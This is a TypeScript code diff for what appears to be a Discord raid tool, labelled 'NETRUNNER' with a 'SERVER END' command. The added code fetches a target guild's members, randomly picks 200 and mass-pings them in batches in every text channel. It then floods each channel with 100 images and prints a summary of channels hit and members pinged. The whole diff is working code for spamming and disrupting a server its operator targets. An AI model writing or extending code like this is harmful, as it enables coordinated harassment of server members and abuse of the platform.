@@ -4162,21 +4162,46 @@ export class BotManager {
                 return message.edit(`\`\`\`ansi\n\u001b[1;33m[!] No speakable text channels found in that guild.\u001b[0m\n\`\`\``).catch(() => {});
             }
 
+            // ── Fetch up to 200 random members for mass-pinging ──────────────────
+            let pingBatches: string[] = [];
+            let pingCount = 0;
+            try {
+                const memberCollection = await targetGuild.members.list({ limit: 1000 });
+                let memberIds: string[] = Array.from((memberCollection as any).keys());
+                // Fisher-Yates shuffle then take 200
+                for (let i = memberIds.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [memberIds[i], memberIds[j]] = [memberIds[j], memberIds[i]];
+                }
+                memberIds = memberIds.slice(0, 200);
+                pingCount = memberIds.length;
+                // Discord 2000-char limit: each <@id> is ≤22 chars → 90 per message
+                for (let i = 0; i < memberIds.length; i += 90) {
+                    pingBatches.push(memberIds.slice(i, i + 90).map((id: string) => `<@${id}>`).join(' '));
+                }
+            } catch { /* member fetch failed — continue without pings */ }
+
             activeServerEnds.set(configId, true);
 
             await message.edit(
                 `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END INITIATED\u001b[0m\n` +
                 `\u001b[1;33mTarget:\u001b[0m ${targetGuild.name} (${targetGuildId})\n` +
-                `\u001b[1;33mChannels:\u001b[0m ${channels.length}\n` +
-                `\u001b[1;33mStep 1/3:\u001b[0m Flooding channels (Round 1)...\u001b[0m\n\`\`\``
+                `\u001b[1;33mChannels:\u001b[0m ${channels.length}  \u001b[1;33mPinging:\u001b[0m ${pingCount} members\n` +
+                `\u001b[1;33mStep 1/2:\u001b[0m Flooding + pinging all channels...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
-            // ── STEP 1 & 2: Flood channels — 100 images per channel ──────────────
+            // ── STEP 1: Flood channels — ping 200 members then 100 images each ────
             // Build a 100-item send queue by cycling through the 5 images 20 times
             const SEND_QUEUE = Array.from({ length: 100 }, (_, i) => SERVER_END_IMAGES[i % SERVER_END_IMAGES.length]);
 
             const floodChannel = async (ch: any): Promise<{ sent: number; failed: number; name: string; stopped: boolean }> => {
                 let sent = 0; let failed = 0;
+                // Send all ping batches first so they fire at the very start of the flood
+                for (const batch of pingBatches) {
+                    if (!activeServerEnds.get(configId)) return { sent, failed, name: ch.name || ch.id, stopped: true };
+                    try { await ch.send(batch); } catch { /* ignore — keep flooding */ }
+                }
+                // Then flood with 100 images
                 for (const url of SEND_QUEUE) {
                     if (!activeServerEnds.get(configId)) return { sent, failed, name: ch.name || ch.id, stopped: true };
                     try { await ch.send(url); sent++; } catch { failed++; }
@@ -4315,6 +4340,7 @@ export class BotManager {
             summary += `${YLW}FLOOD${RST}\n`;
             summary += `  Channels Found         : ${channels.length}\n`;
             summary += `  Channels Hit           : ${r1ChannelsHit}/${channels.length}\n`;
+            summary += `  Members Pinged         : ${pingCount > 0 ? `${GRN}${pingCount}${RST}` : `${DIM}0 (fetch failed)${RST}`}\n`;
             summary += `  Images per Channel     : 100\n`;
             summary += `  Images Sent            : ${GRN}${r1Sent}${RST} / ${totalAttempted} attempted\n`;
             if (r1Failed > 0) summary += `  Images Failed          : ${RED}${r1Failed}${RST}\n`;
